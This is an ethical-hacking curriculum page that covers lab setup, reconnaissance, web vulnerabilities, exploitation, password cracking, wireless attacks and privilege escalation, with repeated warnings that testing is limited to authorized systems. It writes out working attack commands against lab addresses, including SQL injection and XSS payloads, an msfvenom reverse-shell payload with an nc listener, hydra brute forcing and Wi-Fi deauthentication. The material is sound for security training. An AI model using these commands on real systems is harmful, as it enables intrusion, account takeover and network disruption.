Learn Ethical Hacking — The Right Way

This is a self-paced curriculum for learning offensive security: how attackers think, how systems break, and how to find and fix vulnerabilities before criminals do. Every technique here is meant to be practiced only on systems you own or are explicitly authorized to test.

No signup, no tracking, no paywall. Just a map of what to learn and in what order.

1. Rules & Legality — Read This First

The single most important rule: Never test, scan, or attack any system, network, or account unless you personally own it or have explicit, written authorization from the owner. Everything past this point assumes you are operating in a lab, a CTF, a bug bounty program's defined scope, or a signed penetration-testing contract.
  • Unauthorized access is a crime in most countries — e.g. the Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and equivalent laws elsewhere — regardless of intent, even "just looking."
  • Authorization must be explicit and in writing. A verbal "sure, go ahead" is not a get-out-of-jail card. Professional engagements use a signed Rules of Engagement document defining scope, dates, and allowed techniques.
  • Bug bounty programs (HackerOne, Bugcrowd, or a company's own /security.txt policy) define exactly what's in scope — stay inside those boundaries.
  • Practice legally using the lab setups and platforms in sections 3 and 16 — they exist precisely so you never have to touch a system you don't have permission to touch.
  • When in doubt: don't. Ask the owner, or don't do it.

2. What Is Ethical Hacking?

Ethical hacking (also called penetration testing or "pentesting") is the practice of legally simulating attacks against systems to find weaknesses before malicious actors do. The output isn't chaos — it's a report that helps an organization fix its security.

The hats

  • White hat — authorized security testing, the subject of this guide.
  • Black hat — unauthorized, malicious hacking. Illegal.
  • Grey hat — testing without authorization but without malicious intent. Still illegal and strongly discouraged.

The typical engagement phases

  1. Scoping & authorization — agree what's tested, when, and how.
  2. Reconnaissance — gather information (section 5).
  3. Scanning & enumeration — map live hosts, ports, services (section 6).
  4. Vulnerability analysis — identify weaknesses (section 7).
  5. Exploitation — prove impact safely (section 9).
  6. Post-exploitation — assess blast radius (section 13).
  7. Reporting — the actual deliverable that creates value (section 15).
  8. Remediation retest — confirm fixes actually work.

3. Building Your Lab

Everything you practice should happen in an isolated environment you control.

3.1 Attacker machine

  • Install a hypervisor: VirtualBox (free) or VMware Workstation Player.
  • Download Kali Linux or Parrot OS — Linux distributions pre-loaded with security tools.
  • Give the VM enough resources (4GB+ RAM, 2 CPU cores) and set its network adapter to Host-Only or Internal Network so it can't reach the real internet or your home network by accident.

3.2 Deliberately vulnerable targets

  • Metasploitable 2/3 — an intentionally vulnerable Linux VM for practicing network and service exploitation.
  • DVWA (Damn Vulnerable Web Application) & OWASP Juice Shop — vulnerable web apps for practicing web attacks.
  • WebGoat — OWASP's guided vulnerable web app with lessons built in.
  • VulnHub — hundreds of free downloadable vulnerable VMs, boot-to-root style.
Golden rule of lab networking: put attacker and target VMs on the same isolated virtual network, with no bridge to your home Wi-Fi. This keeps your practice contained and safe. 
# Example: quick Juice Shop target via Docker, isolated on its own network
docker run --rm -p 3000:3000 bkimminich/juice-shop

4. Core Fundamentals

Attacks are built on fundamentals. Don't skip these.

Networking

  • OSI / TCP-IP model, IP addressing, subnetting
  • TCP vs UDP, the three-way handshake
  • Common ports: 21 FTP, 22 SSH, 23 Telnet, 25 SMTP, 53 DNS, 80/443 HTTP(S), 445 SMB, 3389 RDP
  • DNS resolution, HTTP request/response structure

Linux command line

ls -la          # list files, including hidden
cd /path        # change directory
cat file.txt    # print file contents
grep -r "pat" . # recursive search
chmod +x file   # make executable
ps aux          # running processes
netstat -tulpn  # listening ports
man command     # read the manual for any command

Scripting

Learn enough Bash and Python to read and modify existing exploit scripts and automate repetitive recon tasks.

5. Reconnaissance & OSINT

Passive recon gathers information without touching the target directly.

  • WHOIS — domain registration info
  • DNS enumeration — subdomains, mail servers, TXT records
  • Google dorking — site:example.com filetype:pdf, intitle:"index of"
  • Shodan / Censys — search engines for internet-connected devices
  • theHarvester — emails, subdomains, names from public sources
  • LinkedIn / social media — org structure for social engineering awareness
whois example.com
dig example.com ANY
theHarvester -d example.com -b google,bing
amass enum -d example.com          # subdomain enumeration

6. Scanning & Enumeration

Active recon: touching the target to map what's alive and listening.

# Host discovery
nmap -sn 192.168.56.0/24

# Fast port scan
nmap -F 192.168.56.10

# Full TCP scan with service/version detection
nmap -p- -sV -sC -oN scan.txt 192.168.56.10

# UDP scan (slower, often skipped, don't skip it)
nmap -sU --top-ports 20 192.168.56.10
  • nmap — the standard for host/port/service discovery.
  • Enumeration by service: SMB (enum4linux, smbclient), web (gobuster, ffuf for directories/files), SNMP (onesixtyone).
gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt
enum4linux -a 192.168.56.10

7. Vulnerability Analysis

Turn discovered services into a list of candidate weaknesses.

  • searchsploit — offline Exploit-DB search by service/version.
  • Nessus / OpenVAS — automated vulnerability scanners for broad coverage.
  • Nikto — quick web server misconfiguration/vuln scanner.
  • Cross-reference software versions against CVE databases (NVD, Vulners).
searchsploit apache 2.4.49
nikto -h http://192.168.56.10
Automated scanners find candidates, not proof. Always validate manually before reporting a finding.

8. Web Application Hacking (OWASP Top 10)

Most real-world engagements are web apps. Learn these deeply — practice each on DVWA, Juice Shop, or PortSwigger Web Security Academy (free, excellent, legal labs).

Injection (SQL Injection, Command Injection)

' OR '1'='1              -- classic auth bypass payload
' UNION SELECT username, password FROM users --

sqlmap -u "http://target/item?id=1" --dbs   # automated SQLi

Cross-Site Scripting (XSS)

<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>

Other essentials

  • Broken Access Control / IDOR — changing an ID in a URL/API call to access another user's data (/invoice?id=1002 → 1003).
  • CSRF — tricking an authenticated user's browser into making an unwanted request.
  • SSRF — making the server fetch an attacker-chosen URL, often reaching internal-only services.
  • Security misconfiguration — default creds, verbose errors, exposed admin panels.
  • Insecure file upload — uploading a web shell disguised as an image or bypassing extension checks.
  • Authentication & session flaws — weak password resets, predictable tokens, missing rate limiting.

Core tool: Burp Suite

Intercept and modify HTTP requests, automate fuzzing with Intruder, and map applications with the Proxy/Spider. This is the daily driver for web pentesting.

9. Exploitation

Turning a vulnerability into proven, controlled impact — never further than the engagement scope requires.

# Metasploit framework
msfconsole
search type:exploit platform:linux apache
use exploit/multi/http/apache_something
set RHOSTS 192.168.56.10
set LHOST 192.168.56.5
run

# Generate a payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f elf > shell.elf

# Catch the reverse shell
nc -lvnp 4444
  • Metasploit — framework of pre-built, modular exploits and payloads.
  • Manual exploitation — modifying public PoC code from Exploit-DB/GitHub to fit the target; understand what the code does before running it.
  • Reverse vs. bind shells — reverse shells call back to you, bypassing inbound firewall rules; bind shells listen on the target.

10. Password Attacks

  • Dictionary/wordlist attacks — try known common passwords (rockyou.txt).
  • Brute force — try all combinations (slow, last resort).
  • Credential stuffing — reuse breached credentials across services (scope-only).
  • Hash cracking — recover plaintext from a stolen hash offline.
# Online service brute force (only against authorized targets)
hydra -l admin -P rockyou.txt ssh://192.168.56.10

# Offline hash cracking
hashcat -m 0 -a 0 hashes.txt rockyou.txt     # MD5 dictionary attack
john --wordlist=rockyou.txt hashes.txt
Always throttle/lockout-aware test online brute force — it's noisy, easily detected, and can lock out real accounts in production.

11. Wireless Security

  • Monitor mode — putting a wireless adapter into packet-capture mode.
  • WPA/WPA2 handshake capture and offline cracking against your own access point.
  • Awareness of evil twin / rogue AP attacks so you can recognize and defend against them.
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng --deauth 5 -a <BSSID> wlan0mon   # your own AP only
aircrack-ng -w rockyou.txt -b <BSSID> capture.cap
Only test wireless networks and access points you own. Deauthenticating or cracking a neighbor's Wi-Fi is illegal.

12. Privilege Escalation

Once you have low-privilege access, escalate to admin/root to show full impact.

  • Linux: misconfigured SUID binaries, writable cron jobs, kernel exploits, weak sudo rules. Automate discovery with linpeas.sh.
  • Windows: unquoted service paths, stored credentials, weak service permissions, token impersonation. Automate with winPEAS.exe.
./linpeas.sh
sudo -l                     # what can this user run as root?
find / -perm -4000 2>/dev/null   # SUID binaries

13. Post-Exploitation

Demonstrate the real-world impact of a foothold, strictly within engagement scope.

  • Data discovery — what sensitive data is reachable from this position?
  • Lateral movement / pivoting — using a compromised host to reach otherwise-unreachable network segments.
  • Persistence — understand these mechanisms defensively; in a real test, always clean up anything you add and document it in the report.

14. Social Engineering

Humans are frequently the weakest link. Understanding these attacks helps you defend against them and, when explicitly authorized, test an organization's awareness.

  • Phishing — deceptive emails/links designed to steal credentials or install malware.
  • Pretexting — impersonating a trusted role (IT support, vendor) to extract information.
  • Physical tailgating — following an employee through a badge-locked door.
Social engineering engagements require unusually explicit, written authorization naming exactly who/what may be targeted and how. Never run phishing simulations against real people without that.

15. Reporting & Responsible Disclosure

The report is the actual product of a pentest — a finding that isn't documented clearly didn't happen.

A good finding includes

  • Title and severity (CVSS score)
  • Description of the vulnerability
  • Steps to reproduce (clear enough for a developer to replicate)
  • Evidence (screenshots, request/response, PoC code)
  • Business impact
  • Remediation recommendation

Responsible / coordinated disclosure

If you find a vulnerability outside a formal engagement (e.g. in a product you use), report it privately to the vendor first — check for a /.well-known/security.txt file or a bug bounty program — and give them reasonable time to fix it before any public discussion.

16. Practice Platforms (Legal, Built for This)

  • TryHackMe — guided, beginner-friendly rooms and learning paths.
  • Hack The Box — realistic boot-to-root machines, ranges from easy to expert.
  • PortSwigger Web Security Academy — free, deep, hands-on web vuln labs.
  • OverTheWire — wargames for Linux/CLI fundamentals (Bandit is a great starting point).
  • PicoCTF — beginner-friendly CTF challenges, great for students.
  • VulnHub — downloadable vulnerable VMs for offline practice.
  • HackerOne / Bugcrowd — real bug bounty programs once you're ready — always stay inside the published scope.

17. Certifications & Careers

  • CompTIA Security+ — foundational security concepts, good starting point.
  • eJPT (eLearnSecurity) — affordable, practical entry-level pentest cert.
  • PenTest+ (CompTIA) — broader pentest methodology certification.
  • OSCP (Offensive Security) — the industry-respected, hands-on exam; widely considered a strong milestone.
  • CEH (EC-Council) — widely recognized, more theory-heavy.

Career paths: penetration tester, red teamer, security researcher, bug bounty hunter, SOC analyst → detection engineer, application security engineer.
